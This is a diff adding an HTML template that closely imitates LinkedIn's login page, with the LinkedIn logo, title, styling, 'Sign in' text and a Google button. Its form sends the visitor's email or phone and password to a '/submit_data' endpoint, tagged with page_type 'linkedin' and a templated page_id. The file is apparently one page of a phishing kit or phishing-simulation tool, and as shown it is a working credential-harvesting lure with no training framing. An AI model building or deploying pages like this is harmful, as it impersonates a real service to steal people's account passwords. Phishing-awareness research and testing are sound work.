@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --linkedin-blue: #0a66c2;
+            --linkedin-blue-hover: #004182;
+            --linkedin-black: #000000;
+            --linkedin-gray: #666666;
+            --linkedin-light-gray: #eef3f8;
+            --linkedin-border: #e1e9ef;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif;
+            background-color: var(--linkedin-light-gray);
+            color: var(--linkedin-black);
+            line-height: 1.5;
+        }
+        
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 24px 12px;
+        }
+        
+        .header {
+            width: 100%;
+            max-width: 1128px;
+            margin-bottom: 24px;
+        }
+        
+        .linkedin-logo {
+            height: 32px;
+            color: var(--linkedin-blue);
+        }
+        
+        .login-box {
+            background: #fff;
+            border-radius: 8px;
+            padding: 24px;
+            max-width: 416px;
+            width: 100%;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .login-title {
+            font-size: 32px;
+            font-weight: 600;
+            line-height: 1.25;
+            margin-bottom: 8px;
+            color: rgba(0, 0, 0, 0.9);
+        }
+        
+        .login-subtitle {
+            font-size: 14px;
+            color: rgba(0, 0, 0, 0.9);
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: rgba(0, 0, 0, 0.75);
+            margin-bottom: 4px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            line-height: 1.33333;
+            font-weight: 400;
+            border: 1px solid rgba(0, 0, 0, 0.6);
+            border-radius: 4px;
+            outline: none;
+            color: rgba(0, 0, 0, 0.9);
+            background: #fff;
+            transition: all 0.2s;
+        }
+        
+        .form-control:focus {
+            border: 2px solid var(--linkedin-blue);
+            padding: 11px;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--linkedin-blue);
+            font-weight: 600;
+            font-size: 14px;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .forgot-password {
+            display: inline-block;
+            color: var(--linkedin-blue);
+            font-weight: 600;
+            font-size: 16px;
+            text-decoration: none;
+            margin-bottom: 24px;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+            color: var(--linkedin-blue-hover);
+        }
+        
+        .signin-button {
+            width: 100%;
+            padding: 16px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #fff;
+            background-color: var(--linkedin-blue);
+            border: none;
+            border-radius: 28px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .signin-button:hover {
+            background-color: var(--linkedin-blue-hover);
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid var(--linkedin-border);
+        }
+        
+        .divider-text {
+            padding: 0 10px;
+            color: rgba(0, 0, 0, 0.6);
+            font-size: 14px;
+        }
+        
+        .google-button {
+            width: 100%;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            color: rgba(0, 0, 0, 0.6);
+            background-color: #fff;
+            border: 1px solid rgba(0, 0, 0, 0.6);
+            border-radius: 28px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.2s;
+        }
+        
+        .google-button:hover {
+            background-color: rgba(0, 0, 0, 0.04);
+            border-color: rgba(0, 0, 0, 0.9);
+            color: rgba(0, 0, 0, 0.9);
+        }
+        
+        .signup-prompt {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 16px;
+            color: rgba(0, 0, 0, 0.9);
+        }
+        
+        .signup-link {
+            color: var(--linkedin-blue);
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .signup-link:hover {
+            text-decoration: underline;
+            color: var(--linkedin-blue-hover);
+        }
+        
+        @media (max-width: 768px) {
+            .login-container {
+                padding: 0;
+            }
+            
+            .header {
+                padding: 16px;
+            }
+            
+            .login-box {
+                border-radius: 0;
+                box-shadow: none;
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <header class="header">
+            <svg class="linkedin-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 84 21" preserveAspectRatio="xMinYMin meet" fill="currentColor">
+                <g>
+                    <path d="M12.5 2.75a1.75 1.75 0 101.8 1.75 1.75 1.75 0 00-1.8-1.75zM11 8h3v10h-3zM22.34 8h-3.24v4.51A2.57 2.57 0 0116.8 15h-.22v3h1.4a5.49 5.49 0 005.36-5.49zm7.51 0h-3v10h3zm.44-2.5a1.75 1.75 0 10-1.7 1.75 1.75 1.75 0 001.7-1.75zM43 9.25V8h-3v10h3v-5.6a3.32 3.32 0 012.71-1.15c2.41 0 3.29 2.16 3.29 3.75v3h3v-3.75a6.37 6.37 0 00-6.42-6.8A5.11 5.11 0 0043 9.25zm-8-1.13A3.92 3.92 0 0031.11 7 4.52 4.52 0 0027 11.75 4.53 4.53 0 0031.11 16a4 4 0 003.73-1.88v1.88H38V8h-3zm-2.93 6.88A2.53 2.53 0 1134.57 12a2.54 2.54 0 01-2.5 3zm19.93-8.75h-3.24v4.51A2.57 2.57 0 0146.8 13h-.22v3h1.4a5.49 5.49 0 005.36-5.49zm7.51 0h-3v10h3zm.44-2.5a1.75 1.75 0 10-1.7 1.75 1.75 1.75 0 001.7-1.75zM67 13.25c0-2.41-1.6-5.25-5.08-5.25a4.86 4.86 0 00-4.92 5 4.75 4.75 0 004.92 5c2.58 0 4.17-1.29 4.74-3h-2.44a2.14 2.14 0 01-2.12 1.25 2.54 2.54 0 01-2.64-2h7.44c.05-.25.1-.75.1-1zm-7.44-1c.11-1.06.89-2 2.36-2s2.14.91 2.22 2zm9.92-2.87a4.12 4.12 0 013.89 1.88V8h3v10h-3v-1.88A3.9 3.9 0 0169.48 18 4.53 4.53 0 0165 14.25 4.53 4.53 0 0169.48 10zm.37 6.88A2.53 2.53 0 1072.35 14a2.54 2.54 0 01-2.5 2.88z"/>
+                </g>
+            </svg>
+        </header>
+        
+        <main class="login-box">
+            <h1 class="login-title">Sign in</h1>
+            <p class="login-subtitle">Stay updated on your professional world</p>
+            
+            <form method="POST" action="/submit_data">
+                <input type="hidden" name="page_type" value="linkedin">
+                <input type="hidden" name="page_id" value="{{ page_id }}">
+                
+                <div class="form-group">
+                    <label class="form-label" for="username">Email or Phone</label>
+                    <input type="text" class="form-control" id="username" name="username" required>
+                </div>
+                
+                <div class="form-group" style="position: relative;">
+                    <label class="form-label" for="password">Password</label>
+                    <input type="password" class="form-control" id="password" name="password" required>
+                    <button type="button" class="show-password">Show</button>
+                </div>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+                
+                <button type="submit" class="signin-button">Sign in</button>
+                
+                <div class="divider">
+                    <span class="divider-text">or</span>
+                </div>
+                
+                <button type="button" class="google-button">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="20px" height="20px">
+                        <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
+                        <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
+                        <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
+                        <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
+                    </svg>
+                    Continue with Google
+                </button>
+            </form>
+            
+            <p class="signup-prompt">
+                New to LinkedIn? <a href="#" class="signup-link">Join now</a>
+            </p>
+        </main>
+    </div>
+    
+    <script>
+        document.querySelector('.show-password').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+            this.textContent = type === 'password' ? 'Show' : 'Hide';
+        });
+    </script>
+</body>
+</html> 
